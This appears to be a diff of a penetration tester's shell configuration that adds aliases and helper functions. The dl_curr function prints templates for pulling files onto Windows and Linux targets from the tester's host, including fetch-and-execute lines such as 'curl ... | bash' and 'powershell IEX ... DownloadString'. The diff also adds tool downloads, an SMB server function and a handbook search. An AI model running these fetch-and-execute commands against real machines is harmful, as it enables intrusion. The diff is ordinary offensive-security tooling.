@@ -14,6 +14,7 @@ alias f="ranger"
 alias history="history 0"
 alias ls="lsd"
 alias lsa="ls -la"
+alias md="mkdir -p"
 
 edit_command() {
   tmp_file="$(mktemp)"
@@ -69,12 +70,18 @@ dl_curr() {
       echo "powershell -c \"(new-object System.Net.WebClient).DownloadFile('http://$address:$port/$f','$file_name')\""
       echo "powershell -c \"wget 'http://$address:$port/$f' -outfile $file_name\" -UseBasicParsing"
       echo "powershell IEX (New-Object Net.WebClient).DownloadString(\'http://$address:$port/$f\')"
-      echo "curl \"http://$address:$port/$f\" --output $file_name"
+      echo "curl \"http://$address:$port/$f\" -outputfile $file_name"
+      echo "wget http://$address:$port/$f -outputfile $file_name"
+      echo "Invoke-WebRequest -Uri http://$address:$port/$f -OutFile '$file_name'"
+      echo "Copy-Item -Source \\\\$address\\kali\\$f -Destination '$file_name'"
     fi
     if [ "$1" = "lin" ]; then
       echo "wget \"http://$address:$port/$f\""
       echo "wget -qO- \"http://$address:$port/$f\" | bash"
       echo "curl \"http://$address:$port/$f\" | bash"
+      echo "curl $address:$port/$f | bash"
+      echo "curl -o '$file_name' $address:$port/$f"
+      echo "python -c \"import urllib; print urllib.urlopen('http://$address:$port/$f').read()\" > \"$file_name\""
     fi
     echo ""
   done
@@ -204,10 +211,29 @@ update_external_tools() {
   wget -O /opt/external/traitor-386 "$(curl -s https://api.github.com/repos/liamg/traitor/releases/latest | jq -r '.assets[].browser_download_url' | grep 'traitor-386')" && \
   wget -O /opt/external/traitor-amd64 "$(curl -s https://api.github.com/repos/liamg/traitor/releases/latest | jq -r '.assets[].browser_download_url' | grep 'traitor-amd64')" && \
   wget -O /opt/external/SharpWeb.exe "$(curl -s https://api.github.com/repos/liamg/traitor/releases/latest | jq -r '.assets[].browser_download_url' | grep '.*.exe')" && \
-  mkdir -p /opt/external/SharpCollection && git clone https://github.com/Flangvik/SharpCollection /opt/external/SharpCollection
-
+  mkdir -p /opt/external/SharpCollection && git clone https://github.com/Flangvik/SharpCollection /opt/external/SharpCollection &&
+  wget -O /opt/external/PrivescCheck.ps1 https://raw.githubusercontent.com/itm4n/PrivescCheck/master/PrivescCheck.ps1
 }
 
 update_repos() {
-  echo "TODO"
+  curr_dir="$PWD"
+  find /opt/repos -maxdepth 1 -type d | tail -n +2 | xargs -I {} sh -c 'cd "{}" && git pull'
+}
+
+smbserver() {
+  port="445"
+  [ "$1" != "" ] && port="$1"
+  sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support -password '' kali "$PWD"
+}
+
+shb() {
+  repo_path="/opt/repos/hacking-handbook"
+  search="$1"
+  [ "$search" = "" ] && search=".*"
+  [ "$2" = "stdout" ] && rg "$search" "$repo_path" && return
+
+  selection="$(rg "$search" "$repo_path" | fzf)"
+  echo "Copied to clipboard:"
+  echo "$selection"
+  echo "$selection" | xclip -selection clipboard
 }
